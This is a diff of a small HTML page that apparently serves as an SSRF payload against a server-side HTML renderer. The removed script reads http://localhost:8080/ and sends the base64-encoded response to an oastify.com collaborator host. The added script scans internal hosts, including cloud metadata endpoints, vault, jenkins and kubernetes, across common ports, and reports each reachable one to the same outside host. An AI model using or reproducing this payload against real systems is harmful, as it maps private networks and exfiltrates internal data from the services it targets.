@@ -9,17 +9,42 @@
 
 <body>
     <h1>Hello</h1>
-    <img src="https://bq521qifph13vszubk955ev2rtxklh96.oastify.com/?ItsRenderingHtml">
+    <img src="https://tc9kn84xbznlhalcx2vnrwhkdbj270vp.oastify.com/?ItsRenderingHtml">
     <script>
-        var x = new XMLHttpRequest();
-        x.open("GET", "http://localhost:8080/");
-        x.onload = function () {
-            new Image().src = "https://bq521qifph13vszubk955ev2rtxklh96.oastify.com/?leak=" + btoa(x.responseText);
-        };
-        x.onerror = function () {
-            new Image().src = "https://bq521qifph13vszubk955ev2rtxklh96.oastify.com/?error=XHRfail";
-        };
-        x.send();
+        const hosts = [
+            "localhost",
+            "127.0.0.1",
+            "host.docker.internal",
+            "internal",
+            "gateway",
+            "metadata.google.internal",
+            "metadata.aws.internal",
+            "kubernetes.default",
+            "vault.internal",
+            "jenkins.internal",
+            "grafana",
+            "prometheus",
+            "gitlab",
+            "nexus",
+            "dev",
+            "staging",
+            "prod",
+            "db",
+            "admin"
+        ];
+
+        const ports = [80, 443, 8080, 3000, 5000, 8000];
+
+        hosts.forEach(host => {
+            ports.forEach(port => {
+                fetch(`http://${host}:${port}`, { mode: "no-cors" })
+                    .then(() => {
+                        fetch(`https://tc9kn84xbznlhalcx2vnrwhkdbj270vp.oastify.com/?open=${host}:${port}`);
+                    })
+                    .catch(() => { });
+            });
+        });
+
     </script>
 
 </body>
